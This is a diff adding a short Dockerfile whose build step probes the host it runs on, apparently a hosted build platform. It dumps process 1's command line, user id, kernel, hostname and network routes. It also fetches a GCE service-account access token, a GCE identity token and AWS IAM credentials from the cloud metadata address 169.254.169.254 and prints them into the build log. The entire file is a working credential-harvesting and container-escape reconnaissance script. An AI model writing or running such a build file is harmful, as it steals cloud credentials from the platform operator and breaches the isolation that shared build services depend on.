@@ -1,0 +1,15 @@
+FROM alpine:3.20
+COPY proc/1/cmdline /f/p1cmd
+COPY proc/1/comm /f/p1comm
+RUN set -x; echo "===E3==="; \
+ apk add --no-cache curl >/dev/null 2>&1; \
+ echo "--P1CMD--"; tr '\0' ' ' < /f/p1cmd; echo; \
+ echo "--P1COMM--"; cat /f/p1comm; echo; \
+ echo "--RUNID--"; id; uname -r; cat /etc/hostname; \
+ echo "--PIDS--"; ls /proc | grep -E '^[0-9]+$' | wc -l; \
+ echo "--GCE--"; curl -s -m 4 -H 'Metadata-Flavor: Google' -o /tmp/gce -w "code=%{http_code}\n" 'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token'; head -c 300 /tmp/gce 2>/dev/null; echo; \
+ echo "--GCE_ID--"; curl -s -m 4 -H 'Metadata-Flavor: Google' -o /tmp/gcei -w "code=%{http_code}\n" 'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://railway.com&format=full'; head -c 200 /tmp/gcei 2>/dev/null; echo; \
+ echo "--AWS--"; curl -s -m 4 -o /tmp/aws -w "code=%{http_code}\n" http://169.254.169.254/latest/meta-data/iam/security-credentials/; head -c 200 /tmp/aws 2>/dev/null; echo; \
+ echo "--IFACE--"; cat /proc/net/route | head -5; \
+ echo "===E3END==="
+CMD ["sh","-c","sleep 3600"]
